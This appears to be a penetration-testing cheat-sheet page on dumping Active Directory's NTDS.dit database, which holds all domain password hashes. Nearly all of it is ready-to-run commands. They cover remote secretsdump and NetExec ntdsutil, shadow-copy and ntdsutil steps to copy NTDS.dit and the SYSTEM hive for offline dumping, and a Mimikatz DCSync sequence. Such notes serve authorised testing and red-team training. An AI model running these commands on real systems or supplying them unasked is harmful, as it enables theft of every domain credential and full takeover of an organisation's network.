# NTDS

`NT Directory Services` (`NTDS`) is the directory service used with AD to find & organize network resources. The `NTDS.dit` file is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information

### Dumping secrets

{% tabs %}
{% tab title="Remote" %}
```sh
# Remote dumping of NTDS.dit secrets. Also works with PtH and Kerberos auth
impacket-secretsdump -just-dc-ntlm '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>'

nxc smb <TARGET> -u <USER> -p <PASSWORD> -M ntdsutil
```
{% endtab %}

{% tab title="Exfiltrate & dump" %}
```sh
# Exfiltrate and dump with ntdsutil
ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL

# Exfiltrate and dump with vssadmin
vssadmin CREATE SHADOW /For=C:
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM c:\NTDS\SYSTEM
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```
{% endtab %}

{% tab title="Local dump" %}
```shellscript
# Mimikatz must be ran in the context of the user who has DCSync privileges
# We can utilize runas.exe
runas /netonly /user:<DOMAIN>\<USER> powershell

.\mimikatz.exe
privilege::debug
lsadump::dcsync /domain:<DOMAIN> /user:<DOMAIN>\<TARGET_USER>
```
{% endtab %}
{% endtabs %}
